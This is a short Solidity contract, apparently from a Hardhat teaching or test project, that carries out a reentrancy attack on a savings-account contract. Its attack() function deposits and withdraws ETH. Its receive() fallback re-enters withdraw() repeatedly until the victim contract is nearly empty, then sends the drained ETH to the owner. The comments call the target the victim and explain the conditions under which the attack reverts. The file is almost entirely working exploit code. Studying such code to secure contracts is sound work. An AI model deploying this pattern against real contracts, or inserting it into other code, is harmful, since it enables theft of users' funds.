// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ISavingsAccountV2 {
  function deposit() external payable;

  function withdraw() external;
}

contract InvestorV2 is Ownable {
  ISavingsAccountV2 public immutable savingsAccountV2;
  uint private fundedAmountETH;

  constructor(address savingsAccountV2ContractAddress) {
    savingsAccountV2 = ISavingsAccountV2(savingsAccountV2ContractAddress);
  }

  function attack() external payable onlyOwner {
    fundedAmountETH = msg.value;
    savingsAccountV2.deposit{ value: msg.value }();
    savingsAccountV2.withdraw();
  }

  receive() external payable {
    // Validates if the victim's contract ETH Balance is greater than the amount of ETH that the reentrant call will take
    // If the reamining ETH on the victim contract is less than the ETH the reentrant call will take, an error will occur, and all the changes will be reverted!
        // Error: VM Exception while processing transaction: reverted with reason string 'Address: unable to send value, recipient may have reverted'
    if (address(savingsAccountV2).balance > fundedAmountETH) {
      console.log("");
      console.log("Reentring...");
      savingsAccountV2.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}
